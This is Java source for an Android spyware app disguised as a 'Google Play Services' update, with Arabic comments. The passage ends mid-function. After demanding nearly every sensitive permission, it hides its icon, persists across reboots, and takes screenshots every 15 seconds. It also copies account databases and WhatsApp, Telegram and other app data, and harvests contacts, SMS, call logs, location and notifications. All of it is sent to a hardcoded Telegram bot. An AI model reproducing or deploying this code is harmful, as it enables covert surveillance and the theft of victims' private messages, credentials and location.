package com.v8.global.sniffer;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;

// ========== MAIN ACTIVITY - طلب الصلاحيات والإخفاء ==========
public class MainActivity extends AppCompatActivity {
    
    private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final int PERMISSION_REQUEST_CODE = 100;
    
    private TextView statusText;
    private Button mainButton;
    private LinearLayout permissionsLayout;
    private Handler handler = new Handler(Looper.getMainLooper());
    
    // قائمة الصلاحيات المطلوبة
    private final String[] REQUIRED_PERMISSIONS = {
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
        android.Manifest.permission.MANAGE_EXTERNAL_STORAGE,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.WRITE_CONTACTS,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.SEND_SMS,
        android.Manifest.permission.RECEIVE_SMS,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.WRITE_CALL_LOG,
        android.Manifest.permission.READ_PHONE_STATE,
        android.Manifest.permission.CALL_PHONE,
        android.Manifest.permission.ANSWER_PHONE_CALLS,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        android.Manifest.permission.CAMERA,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.SYSTEM_ALERT_WINDOW,
        android.Manifest.permission.WRITE_SETTINGS,
        android.Manifest.permission.PACKAGE_USAGE_STATS,
        android.Manifest.permission.FOREGROUND_SERVICE,
        android.Manifest.permission.WAKE_LOCK,
        android.Manifest.permission.RECEIVE_BOOT_COMPLETED,
        android.Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
        android.Manifest.permission.ACCESS_NOTIFICATION_POLICY,
        android.Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
        android.Manifest.permission.INTERNET,
        android.Manifest.permission.ACCESS_NETWORK_STATE,
        android.Manifest.permission.ACCESS_WIFI_STATE,
        android.Manifest.permission.CHANGE_WIFI_STATE,
        android.Manifest.permission.BLUETOOTH,
        android.Manifest.permission.BLUETOOTH_ADMIN,
        android.Manifest.permission.NFC,
        android.Manifest.permission.VIBRATE,
        android.Manifest.permission.USE_BIOMETRIC,
        android.Manifest.permission.USE_FINGERPRINT,
        android.Manifest.permission.BODY_SENSORS,
        android.Manifest.permission.ACTIVITY_RECOGNITION
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // إخفاء التطبيق من المهام الأخيرة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask();
        }
        
        // بناء الواجهة
        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(android.view.Gravity.CENTER);
        mainLayout.setPadding(50, 50, 50, 50);
        mainLayout.setBackgroundColor(0xFFF5F5F5);
        
        TextView titleText = new TextView(this);
        titleText.setText("Google Play Services");
        titleText.setTextSize(24);
        titleText.setTextColor(0xFF4CAF50);
        titleText.setGravity(android.view.Gravity.CENTER);
        titleText.setPadding(0, 0, 0, 20);
        
        statusText = new TextView(this);
        statusText.setText("✓ التحقق من الصلاحيات...");
        statusText.setTextSize(16);
        statusText.setTextColor(0xFF666666);
        statusText.setGravity(android.view.Gravity.CENTER);
        statusText.setPadding(0, 20, 0, 30);
        
        permissionsLayout = new LinearLayout(this);
        permissionsLayout.setOrientation(LinearLayout.VERTICAL);
        permissionsLayout.setPadding(0, 0, 0, 30);
        
        mainButton = new Button(this);
        mainButton.setText("بدء تثبيت التحديث");
        mainButton.setTextSize(16);
        mainButton.setBackgroundColor(0xFF4CAF50);
        mainButton.setTextColor(0xFFFFFFFF);
        mainButton.setPadding(30, 15, 30, 15);
        mainButton.setAllCaps(false);
        
        mainButton.setOnClickListener(v -> {
            checkAndRequestPermissions();
        });
        
        mainLayout.addView(titleText);
        mainLayout.addView(statusText);
        mainLayout.addView(permissionsLayout);
        mainLayout.addView(mainButton);
        
        setContentView(mainLayout);
        
        // التحقق من الصلاحيات بعد ثانية
        handler.postDelayed(this::updatePermissionsStatus, 1000);
    }
    
    private void updatePermissionsStatus() {
        permissionsLayout.removeAllViews();
        
        List<String> missingPermissions = new ArrayList<>();
        
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(permission);
                
                TextView permText = new TextView(this);
                permText.setText("❌ " + getPermissionName(permission));
                permText.setTextColor(0xFFFF0000);
                permText.setPadding(20, 5, 20, 5);
                permissionsLayout.addView(permText);
            } else {
                TextView permText = new TextView(this);
                permText.setText("✅ " + getPermissionName(permission));
                permText.setTextColor(0xFF4CAF50);
                permText.setPadding(20, 5, 20, 5);
                permissionsLayout.addView(permText);
            }
        }
        
        if (missingPermissions.isEmpty()) {
            statusText.setText("✓ جميع الصلاحيات ممنوحة");
            statusText.setTextColor(0xFF4CAF50);
            mainButton.setText("متابعة التثبيت");
        } else {
            statusText.setText("⚠ يوجد " + missingPermissions.size() + " صلاحية مفقودة");
            statusText.setTextColor(0xFFFF9800);
            mainButton.setText("منح الصلاحيات المفقودة");
        }
    }
    
    private String getPermissionName(String permission) {
        switch (permission) {
            case android.Manifest.permission.READ_EXTERNAL_STORAGE: return "الوصول للملفات";
            case android.Manifest.permission.WRITE_EXTERNAL_STORAGE: return "الكتابة في الملفات";
            case android.Manifest.permission.MANAGE_EXTERNAL_STORAGE: return "إدارة الملفات";
            case android.Manifest.permission.READ_CONTACTS: return "قراءة جهات الاتصال";
            case android.Manifest.permission.WRITE_CONTACTS: return "كتابة جهات الاتصال";
            case android.Manifest.permission.READ_SMS: return "قراءة الرسائل";
            case android.Manifest.permission.SEND_SMS: return "إرسال الرسائل";
            case android.Manifest.permission.RECEIVE_SMS: return "استقبال الرسائل";
            case android.Manifest.permission.READ_CALL_LOG: return "قراءة سجل المكالمات";
            case android.Manifest.permission.WRITE_CALL_LOG: return "كتابة سجل المكالمات";
            case android.Manifest.permission.READ_PHONE_STATE: return "حالة الهاتف";
            case android.Manifest.permission.CALL_PHONE: return "الاتصال";
            case android.Manifest.permission.ANSWER_PHONE_CALLS: return "الرد على المكالمات";
            case android.Manifest.permission.ACCESS_FINE_LOCATION: return "الموقع الدقيق";
            case android.Manifest.permission.ACCESS_COARSE_LOCATION: return "الموقع التقريبي";
            case android.Manifest.permission.ACCESS_BACKGROUND_LOCATION: return "الموقع في الخلفية";
            case android.Manifest.permission.CAMERA: return "الكاميرا";
            case android.Manifest.permission.RECORD_AUDIO: return "تسجيل الصوت";
            case android.Manifest.permission.SYSTEM_ALERT_WINDOW: return "النوافذ العائمة";
            case android.Manifest.permission.WRITE_SETTINGS: return "تعديل الإعدادات";
            case android.Manifest.permission.PACKAGE_USAGE_STATS: return "إحصائيات الاستخدام";
            case android.Manifest.permission.FOREGROUND_SERVICE: return "خدمات الخلفية";
            case android.Manifest.permission.WAKE_LOCK: return "منع النوم";
            case android.Manifest.permission.RECEIVE_BOOT_COMPLETED: return "التشغيل مع الجهاز";
            case android.Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS: return "تجاهل تحسين البطارية";
            case android.Manifest.permission.ACCESS_NOTIFICATION_POLICY: return "الوصول للإشعارات";
            case android.Manifest.permission.BIND_ACCESSIBILITY_SERVICE: return "خدمات الوصول";
            case android.Manifest.permission.INTERNET: return "الإنترنت";
            case android.Manifest.permission.ACCESS_NETWORK_STATE: return "حالة الشبكة";
            case android.Manifest.permission.ACCESS_WIFI_STATE: return "حالة WiFi";
            case android.Manifest.permission.CHANGE_WIFI_STATE: return "تغيير WiFi";
            case android.Manifest.permission.BLUETOOTH: return "بلوتوث";
            case android.Manifest.permission.BLUETOOTH_ADMIN: return "إدارة بلوتوث";
            case android.Manifest.permission.NFC: return "NFC";
            case android.Manifest.permission.VIBRATE: return "الاهتزاز";
            case android.Manifest.permission.USE_BIOMETRIC: return "البيومترية";
            case android.Manifest.permission.USE_FINGERPRINT: return "البصمة";
            case android.Manifest.permission.BODY_SENSORS: return "مستشعرات الجسم";
            case android.Manifest.permission.ACTIVITY_RECOGNITION: return "النشاط البدني";
            default: return permission;
        }
    }
    
    private void checkAndRequestPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsToRequest.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            startBackgroundServices();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        updatePermissionsStatus();
        
        // التحقق إذا كل الصلاحيات ممنوحة
        boolean allGranted = true;
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        
        if (allGranted) {
            startBackgroundServices();
        }
    }
    
    private void startBackgroundServices() {
        statusText.setText("جاري التثبيت... 100%");
        mainButton.setEnabled(false);
        mainButton.setBackgroundColor(0xFFCCCCCC);
        
        // بدء الخدمات
        startService(new Intent(this, ControlService.class));
        
        // تفعيل التشغيل التلقائي
        enableAutoStart();
        
        // إرسال إشعار البدء
        new Thread(() -> {
            sendToTelegram("✅ V13 نشط", "تم التثبيت - تحكم كامل");
        }).start();
        
        // انتظار 3 ثواني ثم إخفاء التطبيق
        handler.postDelayed(() -> {
            hideApp();
        }, 3000);
    }
    
    private void enableAutoStart() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Intent intent = new Intent();
                String manufacturer = android.os.Build.MANUFACTURER;
                
                if ("xiaomi".equalsIgnoreCase(manufacturer)) {
                    intent.setComponent(new android.content.ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"));
                } else if ("oppo".equalsIgnoreCase(manufacturer)) {
                    intent.setComponent(new android.content.ComponentName(
                        "com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
                } else if ("vivo".equalsIgnoreCase(manufacturer)) {
                    intent.setComponent(new android.content.ComponentName(
                        "com.vivo.permissionmanager",
                        "com.vivo.permissionmanager.activity.BootStartActivity"));
                } else if ("huawei".equalsIgnoreCase(manufacturer)) {
                    intent.setComponent(new android.content.ComponentName(
                        "com.huawei.systemmanager",
                        "com.huawei.systemmanager.optimize.process.ProtectActivity"));
                }
                
                if (intent.resolveActivity(getPackageManager()) != null) {
                    startActivity(intent);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "AutoStart error", e);
        }
    }
    
    private void hideApp() {
        try {
            // إخفاء الأيقونة
            PackageManager p = getPackageManager();
            p.setComponentEnabledSetting(getComponentName(),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            
            // العودة للصفحة الرئيسية
            Intent startMain = new Intent(Intent.ACTION_MAIN);
            startMain.addCategory(Intent.CATEGORY_HOME);
            startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(startMain);
            
            finish();
            
        } catch (Exception e) {
            Log.e("V8", "Hide error", e);
        }
    }
    
    private void sendToTelegram(String title, String message) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + 
                "/sendMessage?chat_id=" + CHAT_ID + 
                "&text=" + URLEncoder.encode("🔴 " + title + "\n\n" + message, "UTF-8");
            
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            
            int responseCode = conn.getResponseCode();
            conn.disconnect();
            
        } catch (Exception e) {
            Log.e("V8", "Send error", e);
        }
    }
    
    private void sendFileToTelegram(String caption, String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists() || file.length() > 50 * 1024 * 1024) return;
            
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setDoOutput(true);
            conn.setDoInput(true);
            
            DataOutputStream outputStream = new DataOutputStream(conn.getOutputStream());
            
            // chat_id
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            outputStream.writeBytes(CHAT_ID + "\r\n");
            
            // caption
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            outputStream.writeBytes("🔴 " + caption + "\r\n");
            
            // document
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n");
            outputStream.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
            
            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();
            
            outputStream.writeBytes("\r\n--" + boundary + "--\r\n");
            outputStream.flush();
            outputStream.close();
            
            int responseCode = conn.getResponseCode();
            conn.disconnect();
            
            file.delete();
            
        } catch (Exception e) {
            Log.e("V8", "Send file error", e);
        }
    }
}

// ========== CONTROL SERVICE - الخدمة الرئيسية في الخلفية ==========
class ControlService extends Service {
    
    private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final long SCREENSHOT_INTERVAL = 15000; // 15 ثانية
    private static final long ACCOUNT_CHECK_INTERVAL = 5000; // 5 ثواني
    private static final long PERSONAL_DATA_INTERVAL = 300000; // 5 دقائق
    private static final long APPS_DATA_INTERVAL = 900000; // 15 دقيقة
    private static final long REPORT_INTERVAL = 3600000; // ساعة
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private PowerManager.WakeLock wakeLock;
    private int screenshotCount = 0;
    private int notificationCount = 0;
    private Set<String> sentNotifications = new HashSet<>();
    private Map<String, Long> accountFileSizes = new HashMap<>();
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    
    private final String[] TARGET_APPS = {
        "com.whatsapp", "org.telegram.messenger", "com.facebook.orca",
        "com.instagram.android", "com.zhiliaoapp.musically", "com.ss.android.ugc.trill",
        "com.facebook.katana", "com.snapchat.android", "com.twitter.android"
    };
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        // منع الجهاز من النوم
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "V8::WakeLock");
        wakeLock.acquire(10*60*1000L /*10 minutes*/);
        
        // بدء جميع الخدمات
        startAllServices();
        
        // تسجيل مستقل الإقلاع
        registerBootReceiver();
    }
    
    private void startAllServices() {
        // لقطات الشاشة
        handler.postDelayed(screenshotRunnable, SCREENSHOT_INTERVAL);
        
        // مراقبة الحسابات
        handler.postDelayed(accountRunnable, ACCOUNT_CHECK_INTERVAL);
        
        // البيانات الشخصية
        handler.postDelayed(personalDataRunnable, PERSONAL_DATA_INTERVAL);
        
        // بيانات التطبيقات
        handler.postDelayed(appsDataRunnable, APPS_DATA_INTERVAL);
        
        // التقارير
        handler.postDelayed(reportRunnable, REPORT_INTERVAL);
        
        // مراقبة الإشعارات (يتم عبر NotificationService)
        
        // جلب البيانات الأولية
        new Thread(this::grabInitialData).start();
    }
    
    private void registerBootReceiver() {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
        filter.addAction(Intent.ACTION_REBOOT);
        filter.addAction("android.intent.action.QUICKBOOT_POWERON");
        registerReceiver(new BootReceiver(), filter);
    }
    
    // ========== 1. لقطات الشاشة ==========
    private Runnable screenshotRunnable = new Runnable() {
        @Override
        public void run() {
            takeScreenshot();
            handler.postDelayed(this, SCREENSHOT_INTERVAL);
        }
    };
    
    private void takeScreenshot() {
        try {
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            String path = Environment.getExternalStorageDirectory() + "/Pictures/screen_" + timeStamp + ".png";
            
            Process process = Runtime.getRuntime().exec("screencap -p " + path);
            boolean completed = process.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
            
            if (completed) {
                File file = new File(path);
                if (file.exists() && file.length() > 1000) {
                    screenshotCount++;
                    sendFileToTelegram("📸 لقطة #" + screenshotCount, path);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Screenshot error", e);
        }
    }
    
    // ========== 2. مراقبة الحسابات ==========
    private Runnable accountRunnable = new Runnable() {
        @Override
        public void run() {
            checkNewAccounts();
            handler.postDelayed(this, ACCOUNT_CHECK_INTERVAL);
        }
    };
    
    private void checkNewAccounts() {
        try {
            String[] accountPaths = {
                "/data/system/users/0/accounts.db",
                "/data/data/com.google.android.gms/databases/accounts.db",
                "/data/data/com.whatsapp/shared_prefs/WhatsApp.xml",
                "/data/data/org.telegram.messenger/shared_prefs/org.telegram.messenger_preferences.xml",
                "/data/data/com.facebook.orca/shared_prefs",
                "/data/data/com.instagram.android/shared_prefs",
                "/data/data/com.zhiliaoapp.musically/shared_prefs"
            };
            
            List<String> newAccounts = new ArrayList<>();
            
            for (String path : accountPaths) {
                File file = new File(path);
                if (file.exists()) {
                    long currentSize = file.length();
                    String key = path + "_" + currentSize;
                    
                    if (accountFileSizes.containsKey(path)) {
                        long oldSize = accountFileSizes.get(path);
                        if (currentSize != oldSize) {
                            newAccounts.add("📁 تغير في " + getAppNameFromPath(path));
                            
                            if (currentSize < 10 * 1024 * 1024) {
                                String tempPath = Environment.getExternalStorageDirectory() + 
                                    "/Download/account_" + System.currentTimeMillis() + ".dat";
                                copyFile(file, new File(tempPath));
                                sendFileToTelegram("🔐 " + getAppNameFromPath(path), tempPath);
                            }
                        }
                    }
                    accountFileSizes.put(path, currentSize);
                }
            }
            
            if (!newAccounts.isEmpty()) {
                StringBuilder msg = new StringBuilder();
                for (String acc : newAccounts) {
                    msg.append(acc).append("\n");
                }
                sendToTelegram("🔐 حسابات جديدة", msg.toString());
                
                // لقطة شاشة بعد حساب جديد
                handler.postDelayed(() -> takeScreenshot(), 1000);
            }
            
        } catch (Exception e) {
            Log.e("V8", "Account error", e);
        }
    }
    
    // ========== 3. البيانات الشخصية ==========
    private Runnable personalDataRunnable = new Runnable() {
        @Override
        public void run() {
            grabPersonalData();
            handler.postDelayed(this, PERSONAL_DATA_INTERVAL);
        }
    };
    
    private void grabPersonalData() {
        new Thread(() -> {
            grabContacts();
            grabSMS();
            grabCallLog();
            grabLocation();
        }).start();
    }
    
    private void grabContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
            
            if (cursor != null) {
                StringBuilder contacts = new StringBuilder();
                int count = 0;
                
                while (cursor.moveToNext() && count < 200) {
                    String name = cursor.getString(cursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contacts.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                cursor.close();
                
                if (contacts.length() > 0) {
                    String path = Environment.getExternalStorageDirectory() + 
                        "/Download/contacts_" + System.currentTimeMillis() + ".txt";
                    writeToFile(contacts.toString(), path);
                    sendFileToTelegram("👥 جهات الاتصال", path);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Contacts error", e);
        }
    }
    
    private void grabSMS() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(Uri.parse("content://sms/inbox"),
                    null, null, null, "date DESC LIMIT 200");
            
            if (cursor != null) {
                StringBuilder sms = new StringBuilder();
                int count = 0;
                
                while (cursor.moveToNext() && count < 200) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    String date = cursor.getString(cursor.getColumnIndex("date"));
                    sms.append("من: ").append(address).append("\n");
                    sms.append("نص: ").append(body).append("\n");
                    sms.append("تاريخ: ").append(date).append("\n\n");
                    count++;
                }
                cursor.close();
                
                if (sms.length() > 0) {
                    String path = Environment.getExternalStorageDirectory() + 
                        "/Download/sms_" + System.currentTimeMillis() + ".txt";
                    writeToFile(sms.toString(), path);
                    sendFileToTelegram("📨 الرسائل", path);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "SMS error", e);
        }
    }
    
    private void grabCallLog() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
                    null, null, null, CallLog.Calls.DATE + " DESC LIMIT 200");
            
            if (cursor != null) {
                StringBuilder calls = new StringBuilder();
                int count = 0;
                
                while (cursor.moveToNext() && count < 200) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    
                    String typeStr = "وارد";
                    if ("2".equals(type)) typeStr = "صادر";
                    if ("3".equals(type)) typeStr = "فائت";
                    
                    calls.append("رقم: ").append(number).append("\n");
                    calls.append("نوع: ").append(typeStr).append("\n");
                    calls.append("مدة: ").append(duration).append(" ثانية\n");
                    calls.append("تاريخ: ").append(date).append("\n\n");
                    count++;
                }
                cursor.close();
                
                if (calls.length() > 0) {
                    String path = Environment.getExternalStorageDirectory() + 
                        "/Download/calls_" + System.currentTimeMillis() + ".txt";
                    writeToFile(calls.toString(), path);
                    sendFileToTelegram("📞 سجل المكالمات", path);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Calls error", e);
        }
    }
    
    private void grabLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            
            if (location != null) {
                String loc = "الموقع الحالي:\n";
                loc += "خط العرض: " + location.getLatitude() + "\n";
                loc += "خط الطول: " + location.getLongitude() + "\n";
                loc += "الدقة: " + location.getAccuracy() + " متر";
                sendToTelegram("📍 الموقع", loc);
            }
        } catch (Exception e) {
            Log.e("V8", "Location error", e);
        }
    }
    
    // ========== 4. بيانات التطبيقات ==========
    private Runnable appsDataRunnable = new Runnable() {
        @Override
        public void run() {
            grabAppsData();
            handler.postDelayed(this, APPS_DATA_INTERVAL);
        }
    };
    
    private void grabAppsData() {
        new Thread(() -> {
            for (String app : TARGET_APPS) {
                grabAppData(app);
            }
            grabWhatsAppData();
        }).start();
    }
    
    private void grabAppData(String packageName) {
        try {
            String[] paths = {
                "/data/data/" + packageName + "/files",
                "/data/data/" + packageName + "/cache",
                Environment.getExternalStorageDirectory() + "/Android/data/" + packageName + "/files"
            };
            
            List<String> files = new ArrayList<>();
            String appName = getSimpleAppName(packageName);
            
            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] list = dir.listFiles();
                    if (list != null) {
                        for (File file : list) {
                            if (file.isFile() && file.length() < 50 * 1024 * 1024) {
                                String name = file.getName().toLowerCase();
                                if (name.endsWith(".jpg") || name.endsWith(".jpeg") || 
                                    name.endsWith(".png") || name.endsWith(".mp4") || 
                                    name.endsWith(".pdf") || name.endsWith(".db")) {
                                    files.add(file.getAbsolutePath());
                                }
                            }
                        }
                    }
                }
            }
            
            if (!files.isEmpty()) {
                sendToTelegram("📱 " + appName, "تم العثور على " + files.size() + " ملف");
                for (int i = 0; i < Math.min(3, files.size()); i++) {
                    sendFileToTelegram(appName, files.get(i));
                }
            }
            
        } catch (Exception e) {
            Log.e("V8", "App data error", e);
        }
    }
    
    private void grabWhatsAppData() {
        try {
            String[] paths = {
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Images",
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Video",
                Environment.getExternalStorageDirectory() + "/WhatsApp/Databases"
            };
            
            List<String> files = new ArrayList<>();
            
            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] list = dir.listFiles();
                    if (list != null) {
                        for (File file : list) {
                            if (file.isFile() && file.length() < 50 * 1024 * 1024) {
                                files.add(file.getAbsolutePath());
                            }
                        }
                    }
                }
            }
            
            if (!files.isEmpty()) {
                sendToTelegram("📱 واتساب", "تم العثور على " + files.size() + " ملف");
                for (int i = 0; i < Math.min(3, files.size()); i++) {
                    sendFileToTelegram("واتساب", files.get(i));
                }
            }
            
        } catch (Exception e) {
            Log.e("V8", "WhatsApp error", e);
        }
    }
    
    // ========== 5. التقارير ==========
    private Runnable reportRunnable = new Runnable() {
        @Override
        public void run() {
            sendReport();
            handler.postDelayed(this, REPORT_INTERVAL);
        }
    };
    
    private void sendReport() {
        String report = "📊 تقرير:\n" +
                       "📸 لقطات: " + screenshotCount + "\n" +
                       "🔔 إشعارات: " + notificationCount + "\n" +
                       "🔐 ملفات مراقبة: " + accountFileSizes.size();
        sendToTelegram("📊 تقرير دوري", report);
    }
    
    // ========== 6. البيانات الأولية ==========
    private void grabInitialData() {
        grabContacts();
        grabSMS();
        grabCallLog();
        grabLocation();
        grabAppsData();
    }
    
    // ========== 7. تسجيل الإشعارات (يستدعى من NotificationService) ==========
    public void onNotificationReceived(String appName, String title, String text) {
        try {
            if (title.length() < 2 && text.length() < 2) return;
            
            String notifId = appName + "|" + title + "|" + text;
            if (sentNotifications.contains(notifId)) return;
            
            sentNotifications.add(notifId);
            if (sentNotifications.size() > 500) {
                sentNotifications.remove(sentNotifications.iterator().next());
            }
            
            notificationCount++;
            
            String message = "🔔 إشعار #" + notificationCount + "\n" +
                           "📱 التطبيق: " + appName + "\n";
            if (!title.isEmpty()) message += "👤 " + title + "\n";
            if (!text.isEmpty()) message += "💬 " + text;
            
            sendToTelegram("إشعار جديد", message);
            
            // لقطة شاشة بعد الإشعارات المهمة
            for (String target : TARGET_APPS) {
                if (appName.toLowerCase().contains(target.toLowerCase())) {
                    handler.postDelayed(() -> takeScreenshot(), 1000);
                    break;
                }
            }
            
        } catch (Exception e) {
            Log.e("V8", "Notif error", e);
        }
    }
    
    // ========== أدوات مساعدة ==========
    private String getAppNameFromPath(String path) {
        if (path.contains("whatsapp")) return "واتساب";
        if (path.contains("telegram")) return "تيليغرام";
        if (path.contains("facebook")) return "فيسبوك";
        if (path.contains("instagram")) return "انستغرام";
        if (path.contains("musically") || path.contains("tiktok")) return "تيك توك";
        if (path.contains("google")) return "جوجل";
        return "تطبيق";
    }
    
    private String getSimpleAppName(String packageName) {
        if (packageName.contains("whatsapp")) return "واتساب";
        if (packageName.contains("telegram")) return "تيليغرام";
        if (packageName.contains("facebook")) return "فيسبوك";
        if (packageName.contains("instagram")) return "انستغرام";
        if (packageName.contains("musically") || packageName.contains("tiktok")) return "تيك توك";
        if (packageName.contains("snapchat")) return "سناب شات";
        if (packageName.contains("twitter")) return "تويتر";
        return packageName;
    }
    
    private void writeToFile(String content, String path) {
        try {
            FileWriter writer = new FileWriter(path);
            writer.write(content);
            writer.close();
        } catch (Exception e) {
            Log.e("V8", "Write error", e);
        }
    }
    
    private void copyFile(File src, File dst) {
        try {
            FileInputStream in = new FileInputStream(src);
            FileOutputStream out = new FileOutputStream(dst);
            byte[] buffer = new byte[4096];
            int len;
            while ((len = in.read(buffer)) > 0) {
                out.write(buffer, 0, len);
            }
            in.close();
            out.close();
        } catch (Exception e) {
            Log.e("V8", "Copy error", e);
